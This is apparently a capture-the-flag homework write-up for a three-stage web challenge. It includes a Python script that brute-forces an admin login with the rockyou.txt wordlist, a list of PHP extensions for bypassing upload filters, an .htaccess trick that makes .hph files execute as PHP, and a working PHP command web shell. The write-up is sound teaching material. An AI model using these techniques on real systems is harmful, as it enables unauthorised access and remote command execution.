# Homework 3-B Sutando+ [100 points] (9 solves)
### Stage 1:
In robots.txt file, we can find the php file `/admin_as124j.php`. In the php page, we see there is a youtube channel refers to the famous band "queen", also a hidden login system from the source code of the page. Wild guess the username is `admin`(the system will tell you the username and password are both incorrect if you enter any other username), now we need to find the password.
When we search the relationship between queen band and admin, password, which queen band's song "we will rock you" here is refers to the [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) password leak. We can use the wordlist for password cracking. 
By running below python script:
```python
import requests
url = "http://chal.firebird.sh:35017/admin_as124j.php"

payload = {
    'username': 'admin',
    'password': 'admin',
    'login': 'login'
}

headers = {
    'Host': 'chal.firebird.sh:35017',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://chal.firebird.sh:35017',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://chal.firebird.sh:35017/admin_as124j.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
}


with open("rockyou.txt", encoding="utf-8", errors='ignore') as f:
    password_list = f.readlines()
    total = len(password_list)
    for order, i in enumerate(password_list):
        password = str(i.strip('\n'))
        payload['password'] = password
        response = requests.post(url, data=payload, headers=headers)
        if 'incorrect' not in response.text:
            print(i.strip('\n'))
            break
        else:
            print(f"current progress: {order+1}/{total}  ------  {password}")
```
The list is very long, but the password we want only takes hundreds iteration. Get the password printed, login to next stage.
### Stage 2:
From the page, we can see a fake flag `/flag{R0ck_y0u_1n_y0r3_h34rt_uwu!}` with prefix `/`, this usually implies file or directory. After several attempts, it is a `.php` file.
### Stage 3:
A file upload system, which usually implies the "php upload vulnerability". Some suffix related to php are 
```
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
```
However, most of them will not work, also the system will block you upload `.php` files. The only useful one is `.htaccess`, it could make the system see `.hph` as `.php`. First, upload a file `.htaccess` with content `AddType application/x-httpd-php .hph` to the server, then upload another file with suffix `.hph` with content:
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
We go to the destination of the file, add `?cmd=` after the url to use cmd to check where the file is. 
With `?cmd=ls ../../../../../../ -a`, the flag file was found.